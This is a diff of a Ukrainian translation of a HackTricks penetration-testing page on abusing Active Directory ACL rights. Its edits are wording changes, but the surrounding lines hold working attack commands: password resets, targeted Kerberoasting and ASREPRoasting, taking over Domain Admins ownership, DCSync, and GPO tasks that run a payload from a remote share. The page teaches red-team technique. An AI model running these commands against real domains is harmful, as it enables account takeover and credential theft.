@@ -1,12 +1,12 @@
 # Зловживання ACL/ACE Active Directory
 
 {% hint style="success" %}
-Вивчайте та практикуйте AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Вивчайте та практикуйте GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Вивчайте та практикуйте Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Вивчайте та практикуйте Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Підтримайте HackTricks</summary>
+<summary>Підтримка HackTricks</summary>
 
 * Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
 * **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
@@ -15,20 +15,20 @@
 </details>
 {% endhint %}
 
-**Ця сторінка в основному є підсумком технік з** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **та** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Для отримання додаткових деталей перевірте оригінальні статті.**
+**Ця сторінка в основному є підсумком технік з** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **та** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Для отримання додаткової інформації перегляньте оригінальні статті.**
 
 ## **Права GenericAll на користувача**
 
 Ця привілегія надає зловмиснику повний контроль над цільовим обліковим записом користувача. Після підтвердження прав `GenericAll` за допомогою команди `Get-ObjectAcl`, зловмисник може:
 
 * **Змінити пароль цілі**: Використовуючи `net user <username> <password> /domain`, зловмисник може скинути пароль користувача.
-* **Цілеспрямоване Kerberoasting**: Призначити SPN обліковому запису користувача, щоб зробити його доступним для kerberoasting, а потім використовувати Rubeus та targetedKerberoast.py для витягування та спроби зламати хеші квитків на отримання квитків (TGT).
+* **Цілеспрямоване Kerberoasting**: Призначте SPN обліковому запису користувача, щоб зробити його доступним для kerberoasting, а потім використовуйте Rubeus та targetedKerberoast.py для витягування та спроби зламати хеші квитків на отримання квитків (TGT).
 ```powershell
 Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
 .\Rubeus.exe kerberoast /user:<username> /nowrap
 Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
 ```
-* **Targeted ASREPRoasting**: Вимкніть попередню аутентифікацію для користувача, зробивши їх обліковий запис вразливим до ASREPRoasting.
+* **Цілеспрямоване ASREPRoasting**: Вимкніть попередню автентифікацію для користувача, зробивши його обліковий запис вразливим до ASREPRoasting.
 ```powershell
 Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
 ```
@@ -85,7 +85,7 @@ rpcclient -U KnownUsername 10.10.10.192
 ```
 ## **WriteOwner на групу**
 
-Якщо зловмисник виявляє, що має права `WriteOwner` на групу, він може змінити власника групи на себе. Це особливо важливо, коли йдеться про групу `Domain Admins`, оскільки зміна власника дозволяє отримати більший контроль над атрибутами групи та членством. Процес включає в себе ідентифікацію правильного об'єкта за допомогою `Get-ObjectAcl`, а потім використання `Set-DomainObjectOwner` для зміни власника, або за SID, або за ім'ям.
+Якщо зловмисник виявляє, що має права `WriteOwner` на групу, він може змінити власника групи на себе. Це особливо важливо, коли йдеться про групу `Domain Admins`, оскільки зміна власності дозволяє отримати більший контроль над атрибутами групи та членством. Процес включає в себе ідентифікацію правильного об'єкта за допомогою `Get-ObjectAcl`, а потім використання `Set-DomainObjectOwner` для зміни власника, або за SID, або за ім'ям.
 ```powershell
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
 Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
@@ -93,7 +93,7 @@ Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
 ```
 ## **GenericWrite на користувача**
 
-Ця дозволяє зловмиснику змінювати властивості користувача. Зокрема, з доступом `GenericWrite`, зловмисник може змінити шлях до сценарію входу користувача, щоб виконати шкідливий сценарій під час входу користувача. Це досягається за допомогою команди `Set-ADObject`, щоб оновити властивість `scriptpath` цільового користувача, вказавши на сценарій зловмисника.
+Ця дозволяє зловмиснику змінювати властивості користувача. Зокрема, з доступом `GenericWrite`, зловмисник може змінити шлях до скрипту входу користувача, щоб виконати шкідливий скрипт під час входу користувача. Це досягається за допомогою команди `Set-ADObject`, щоб оновити властивість `scriptpath` цільового користувача, вказавши на скрипт зловмисника.
 ```powershell
 Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
 ```
@@ -109,7 +109,7 @@ Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'use
 ```
 ## **WriteDACL + WriteOwner**
 
-Володіння об'єктом AD та наявність привілеїв `WriteDACL` на ньому дозволяє зловмиснику надати собі привілеї `GenericAll` над об'єктом. Це досягається через маніпуляції з ADSI, що дозволяє повний контроль над об'єктом та можливість змінювати його членство в групах. Незважаючи на це, існують обмеження при спробі експлуатувати ці привілеї за допомогою командлетів модуля Active Directory `Set-Acl` / `Get-Acl`.
+Володіння об'єктом AD та наявність привілеїв `WriteDACL` на ньому дозволяє зловмиснику надати собі привілеї `GenericAll` над об'єктом. Це досягається через маніпуляцію ADSI, що дозволяє повний контроль над об'єктом та можливість змінювати його членство в групах. Незважаючи на це, існують обмеження при спробі експлуатувати ці привілеї за допомогою командлетів модуля Active Directory `Set-Acl` / `Get-Acl`.
 ```powershell
 $ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
 $IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
@@ -117,7 +117,7 @@ $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityRe
 $ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
 $ADSI.psbase.commitchanges()
 ```
-## **Replication on the Domain (DCSync)**
+## **Реплікація на домені (DCSync)**
 
 Атака DCSync використовує специфічні дозволи на реплікацію в домені, щоб імітувати Контролер домену та синхронізувати дані, включаючи облікові дані користувачів. Ця потужна техніка вимагає дозволів, таких як `DS-Replication-Get-Changes`, що дозволяє зловмисникам витягувати чутливу інформацію з середовища AD без прямого доступу до Контролера домену. [**Дізнайтеся більше про атаку DCSync тут.**](../dcsync.md)
 
@@ -145,14 +145,14 @@ New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net l
 ```
 ### GroupPolicy module - Зловживання GPO
 
-Модуль GroupPolicy, якщо встановлений, дозволяє створювати та пов'язувати нові GPO, а також встановлювати параметри, такі як значення реєстру для виконання бекдорів на уражених комп'ютерах. Цей метод вимагає оновлення GPO та входу користувача в комп'ютер для виконання:
+Модуль GroupPolicy, якщо встановлений, дозволяє створювати та пов'язувати нові GPO, а також встановлювати параметри, такі як значення реєстру для виконання бекдорів на уражених комп'ютерах. Цей метод вимагає оновлення GPO та входу користувача на комп'ютер для виконання:
 ```powershell
 New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
 Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
 ```
 ### SharpGPOAbuse - Зловживання GPO
 
-SharpGPOAbuse пропонує метод зловживання існуючими GPO, додаючи завдання або змінюючи налаштування без необхідності створення нових GPO. Цей інструмент вимагає модифікації існуючих GPO або використання інструментів RSAT для створення нових перед застосуванням змін:
+SharpGPOAbuse пропонує метод зловживання існуючими GPO, додаючи завдання або змінюючи налаштування без необхідності створення нових GPO. Цей інструмент вимагає модифікації існуючих GPO або використання інструментів RSAT для створення нових перед внесенням змін:
 ```bash
 .\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
 ```
